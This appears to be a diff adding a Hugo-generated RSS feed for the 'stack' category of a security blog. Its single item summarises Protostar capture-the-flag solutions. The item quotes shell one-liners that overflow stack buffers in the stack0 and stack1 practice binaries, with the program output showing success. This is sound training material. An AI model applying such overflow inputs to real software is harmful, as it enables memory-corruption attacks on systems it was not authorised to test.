@@ -1,0 +1,22 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>stack on dronesec</title>
+    <link>https://dronesec.pw/categories/stack/</link>
+    <description>Recent content in stack on dronesec</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>Bryan Alexander</copyright>
+    <lastBuildDate>Sat, 30 Mar 2013 23:21:16 +0000</lastBuildDate><atom:link href="https://dronesec.pw/categories/stack/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Protostar solutions - Stack Levels</title>
+      <link>https://dronesec.pw/blog/protostar-solutions-stack-levels/</link>
+      <pubDate>Sat, 30 Mar 2013 23:21:16 +0000</pubDate>
+      
+      <guid>https://dronesec.pw/blog/protostar-solutions-stack-levels/</guid>
+      <description>Part two of the three exploit exercises available. This set of challenges focused purely on memory corruption via stack overflows; the challenges here weren&amp;rsquo;t too difficult, but I wanted to work through them anyway. A post with the remaining levels will follow.
+user@protostar:~$ python -c &amp;#34;print &amp;#39;A&amp;#39;*70&amp;#34; | ./stack0 you have changed the &amp;#39;modified&amp;#39; variable user@protostar:~$ user@protostar:~$ ./stack1 $(perl -e &amp;#39;print &amp;#34;A&amp;#34;x64 . &amp;#34;dcba&amp;#34;&amp;#39;) you have correctly got the variable to the right value user@protostar:~$ It&amp;rsquo;s also worth noting that, if you&amp;rsquo;re loading this into gdb, the modified variable is volatile, so if you p &amp;amp;modified and don&amp;rsquo;t get the right value, don&amp;rsquo;t worry.</description>
+    </item>
+    
+  </channel>
+</rss>
